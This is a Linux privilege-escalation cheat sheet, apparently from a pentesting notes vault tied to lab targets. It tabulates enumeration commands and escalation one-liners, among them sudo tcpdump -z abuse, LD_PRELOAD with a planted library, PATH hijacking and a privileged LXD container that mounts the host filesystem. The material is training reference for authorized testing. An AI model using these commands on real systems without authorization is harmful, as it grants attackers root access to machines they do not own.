---
title: "Linux Privilege Escalation"
description: "Linux privesc quick-reference: sudo, SUID/SGID, cron, LD_PRELOAD, LXD, NFS, capabilities and kernel."
category: privilege-escalation
tags: [privilege-escalation, linux, post-exploitation]
tools: [linPEAS, pspy, GTFOBins]
difficulty: intermediate
updated: "2026-08-09"
source: "vault:PrivEsc/Linux PrivEsc Cheat Sheet.md"
---

# Linux Privilege Escalation

A dense command checklist for enumerating and exploiting privilege-escalation paths on Linux. Enumerate first (linPEAS / pspy), then map any finding against GTFOBins.

## Enumeration

| Command | Description |
| --- | --- |
| `ssh htb-student@<target IP>` | SSH to lab target |
| `ps aux \| grep root` | See processes running as root |
| `ps au` | See logged in users |
| `ls /home` | View user home directories |
| `ls -l ~/.ssh` | Check for SSH keys for current user |
| `history` | Check the current user's Bash history |
| `sudo -l` | Can the user run anything as another user? |
| `ls -la /etc/cron.daily` | Check for daily Cron jobs |
| `lsblk` | Check for unmounted file systems/drives |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null` | Find world-writable directories |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null` | Find world-writable files |
| `uname -a` | Check the kernel version |
| `cat /etc/lsb-release` | Check the OS version |
| `screen -v` | Check the installed version of `screen` |
| `./pspy64 -pf -i 1000` | View running processes with `pspy` |
| `echo $PATH` | Check the current user's PATH variable contents |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null` | Search for config files |
| `./lynis audit system` | Perform a system audit with `Lynis` |

## Kernel Exploits

| Command | Description |
| --- | --- |
| `gcc kernel_exploit.c -o kernel_exploit` | Compile an exploit written in C |

## SUID / SGID Binaries

| Command | Description |
| --- | --- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SUID bit set |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null` | Find binaries with the SETGID bit set |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump` |

## PATH Abuse

| Command | Description |
| --- | --- |
| `echo $PATH` | Check the current user's PATH variable contents |
| `PATH=.:${PATH}` | Add a `.` to the beginning of the current user's PATH |

## Shared Library / LD_PRELOAD

| Command | Description |
| --- | --- |
| `ldd /bin/ls` | View the shared objects required by a binary |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart` | Escalate privileges using `LD_PRELOAD` |
| `readelf -d payroll \| grep PATH` | Check the RUNPATH of a binary |
| `gcc src.c -fPIC -shared -o /development/libshared.so` | Compile a shared library |

## LXD / LXC

| Command | Description |
| --- | --- |
| `lxd init` | Start the LXD initialization process |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine` | Import a local image |
| `lxc init alpine r00t -c security.privileged=true` | Start a privileged LXD container |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true` | Mount the host file system in a container |
| `lxc start r00t` | Start the container |

## NFS

| Command | Description |
| --- | --- |
| `showmount -e 10.129.2.12` | Show the NFS export list |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt` | Mount an NFS share locally |

## Shared tmux Session

| Command | Description |
| --- | --- |
| `tmux -S /shareds new -s debugsess` | Create a shared `tmux` session socket |
